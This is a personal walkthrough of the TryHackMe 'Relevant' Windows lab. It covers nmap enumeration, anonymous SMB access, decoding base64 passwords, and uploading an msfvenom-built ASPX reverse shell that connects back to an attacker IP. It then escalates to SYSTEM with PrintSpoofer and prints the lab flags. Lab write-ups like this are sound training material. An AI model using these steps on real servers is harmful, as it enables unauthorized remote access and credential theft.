---
title: "Relevant"
date: 2025-03-01
slug: relevant
tags: [tryhackme, windows, web, privesc]
difficulty: Medium
---
IP = 10.10.235.8


**enumeration**
`nmap -sCV -p- 10.10.235.8`
```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-01-11T06:54:06+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2025-01-10T06:41:46
|_Not valid after:  2025-07-12T06:41:46
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-01-11T06:53:27+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC




Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2025-01-11T06:53:26
|_  start_date: 2025-01-11T06:41:47
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)

```

**smb** - server message block protocol this helps us in sharing files over webserver but ensure that you are not using version 1 which is unsafe and has few vulnerabilities 

shows that we can login to the server as user anonymously 
`smbclient -L \\10.10.235.8\\`
where
`smbclient` is command that helps us to interact with the smb servers 
`-L ` list downs the disk shares on server 
`\\\\ \\ `are the path separators 

![[Pasted image 20250111123843.png]]
the nt4wrksv looks suspicious so we will go inside it 
`smbclient \\\\10.10.235.8\\nt4wrksv`
we can use help to list down the smb commands the navigation is similar and to get the files from server to our machine we can use the get command 
![[Pasted image 20250111124455.png]]

```
 cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                      

```

doing base64 we get pass as 
`Bob - !P@$$W0rD!123`
`Bill - Juw4nnaM4n420696969!$$$`

try to login using this credentials using evil-winrm tool 

**WinRM**(windows remote management) - winRM is a protocol that we use to send remote execution commands to remote windows system 
evil-winRM will help us by giving a revhsell connection to the server 

usage 
`evil-winrm -i <target_ip> -u <username> -p <password>`
![[Pasted image 20250111130331.png]]
seems like it is not connecting 


after figuring out for some time i realized that 
from the nmap scan we understand that there is another server running on port **49663**
`49663/tcp open  http          Microsoft IIS httpd 10.0`
![[Pasted image 20250111131032.png]]

enumerating the directories of http://10.10.235.8:49663/ we find that `/nt4wrksv `exists 

IP change
IP =  10.10.153.92

![[Pasted image 20250111223453.png]]

this means the webserver  has the smb files linked and if we try to send files to the smb server that means we can upload rev shell files too 

building a aspx revshell payload using - https://pentest.ws/tools/venom-builder
> A reverse shell exploit using the ASPX format targets Windows servers running IIS, which handles ASPX files through ASP.NET. These files can execute server-side code (e.g., C#, VB.NET). An attacker crafts an ASPX file with a reverse shell payload, often generated with tools like msfvenom. When uploaded to the server, the IIS server executes the malicious code, establishing a reverse shell connection back to the attacker’s machine, providing remote access. This method exploits the server’s native functionality without needing additional software.

![[Pasted image 20250111134629.png]]
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.26.44 LPORT=53 -f aspx -o rev.aspx`


![[Pasted image 20250111230204.png]]

upload the `rev.aspx` file to the smb server 
![[Pasted image 20250111230426.png]]

*changed the port from 53 to 9999 and made another file revs.aspx* 

go to http://10.10.153.92:49663/nt4wrksv/revs.aspx to run the revshell script 
![[Pasted image 20250111231220.png]]

`c:\Users\Bob\Desktop>more user.txt`
`more user.txt`
`THM{fdk4ka34vk346ksxfr21tg789ktf45}`


**privilege escalation**
there is a tool called https://github.com/itm4n/PrintSpoofer which does PE 
From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.

we can upload this to the server using same smb method into the /nt4wrksv dir 

![[Pasted image 20250111232625.png]]

`C:\Users\Administrator\Desktop>more root.txt
`more root.txt`
`THM{1fk5kf469devly1gl320zafgl345pv}`
